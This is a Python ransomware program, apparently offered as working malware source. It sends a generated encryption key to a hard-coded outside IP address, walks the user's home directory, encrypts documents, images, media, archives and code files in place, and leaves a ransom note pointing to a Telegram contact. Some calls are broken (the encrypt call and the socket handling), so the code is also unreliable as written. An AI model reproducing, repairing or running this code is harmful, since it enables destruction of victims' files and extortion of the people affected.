import os
import sys
from time import sleep
from pathlib import Path
from socket import socket, AF_INET, SOCK_STREAM
from cryptography.fernet import Fernet

class Ransomware:
    def __init__(self, host: str, port: str) -> None:
        self.host = host
        self.port = port
        self.server = socket(AF_INET, SOCK_STREAM)
        self.key = Fernet.generate_key()
        self.Private = Fernet(self.key)
        self.system = os.uname().sysname

    def ConnectServer(self, connected = False) -> None:
        retries = 0
        while not connected and retries < 3:
            try:
                self.server.connect((self.host, self.port))
                self.server.sendall(f'{self.system}|{self.key.decode("utf-8")}'.encode('utf-8'))
                connected = True
            except:
                retries += 1
                if retries < 3:
                    sleep(10)
                else:
                    os.execv(sys.executable, [sys.executable] + sys.argv)
            finally:
                self.server.close()

    
    def Encrypted(self):
        for _, files in self.listfiles().items():
            for file in files:
                temp_file = file + '.temp'
                try:
                    with open(file, 'rb') as original_file, open(temp_file, 'wb') as encfile:
                        while True:
                            chunk = original_file.read(4096 * 1024)
                            if not chunk:
                                break
                            enc_chunk = self.Private.encrypt(chunk, 32)[0]
                            encfile.write(enc_chunk)
                    os.replace(temp_file, file)
                except: pass
                finally:
                    if os.path.exists(temp_file):
                        os.remove(temp_file)
    
    def Contact(self):
        contact = '''
                    -----------RANSOMWARE-----------
                    Contact us to recevie the key 
                    and decryption software !!!
                    Telegram: @ransomware0182
                    ---------------------------------
                  '''
        try:
            with open(Path.home()/"Desktop"/'ransomware.txt', 'w') as file:
                file.write(contact)
        except:
            with open(Path.home()/'ransomware.txt', 'w') as file:
                file.write(contact)


    def listfiles(self) -> dict:

        exts = {
            'images': ['.jpg', '.png', '.gif', '.jpeg'],
            'documents': ['.txt', '.docx', '.md', '.doc', '.pdf', '.xlsx'],
            'others': ['.psd', '.eps', '.cdr', '.ppt', '.mp3', '.wav', '.al', '.mov', '.dmg', '.rar', '.zip', '.mp4', '.xlm'],
            'code': ['.c', '.cpp', '.cs', '.java', '.py', '.pyc','.js', '.html', '.css', '.php', '.rb', '.swift', '.sql', '.xml', '.json', '.sh', '.bat', '.ps1', '.ts', '.go', '.rs', '.kt']
        }

        file_categories = {category: [] for category in exts}

        extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

        for entry in Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                file_categories[extcategory[ext]].append(str(entry))

        return file_categories
    
    
if __name__ == '__main__':
    RanSomWare = Ransomware('171.249.211.29', 19100)
    RanSomWare.ConnectServer()
    RanSomWare.Encrypted()
    RanSomWare.Contact()


